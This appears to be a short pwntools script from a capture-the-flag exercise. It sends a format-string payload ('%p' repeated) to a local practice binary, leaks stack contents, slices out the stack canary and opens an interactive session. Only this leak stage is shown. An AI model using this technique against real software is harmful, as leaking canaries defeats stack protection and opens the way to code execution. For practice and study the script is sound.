from pwn import * 

p = process('./pwn_secret')
p.recvuntil("Name:")
p.sendline("AAAABBBB"+ "%p "*15)
leak = p.recvline()
#print leak 

canary = leak[219:237]
print canary 

# python -c 'print "AAAABBBB "+"%p "*6'
p.interactive()




